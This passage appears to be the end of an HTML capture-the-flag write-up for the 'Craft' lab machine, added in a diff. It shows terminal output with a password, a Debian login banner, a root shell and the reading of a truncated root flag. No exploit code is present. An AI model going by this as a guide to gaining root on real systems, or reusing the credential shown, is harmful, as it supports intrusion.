+                &nbsp;&nbsp;&nbsp;|\_|__|__|_/|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;\_________/<br>
+                <br>
+                <br>
+                <br>
+                Password:&nbsp;7ae5ce54-450d-e696-e628-fa9e81e2a9ba<br>
+                Linux&nbsp;craft.htb&nbsp;4.9.0-8-amd64&nbsp;#1&nbsp;SMP&nbsp;Debian&nbsp;4.9.130-2&nbsp;(2018-10-27)&nbsp;x86_64<br>
+                <br>
+                The&nbsp;programs&nbsp;included&nbsp;with&nbsp;the&nbsp;Debian&nbsp;GNU/Linux&nbsp;system&nbsp;are&nbsp;free&nbsp;software;<br>
+                the&nbsp;exact&nbsp;distribution&nbsp;terms&nbsp;for&nbsp;each&nbsp;program&nbsp;are&nbsp;described&nbsp;in&nbsp;the<br>
+                individual&nbsp;files&nbsp;in&nbsp;/usr/share/doc/*/copyright.<br>
+                <br>
+                Debian&nbsp;GNU/Linux&nbsp;comes&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent<br>
+                permitted&nbsp;by&nbsp;applicable&nbsp;law.<br>
+                Last&nbsp;login:&nbsp;Mon&nbsp;Aug&nbsp;19&nbsp;06:50:35&nbsp;2019&nbsp;from&nbsp;10.10.10.110<br>
+                root@craft:~#&nbsp;cat&nbsp;root.txt<br>
+                831d64...
+            </div>
+        </div><br>
+    </writeup>
+</section>
+
+</body>
+</html>
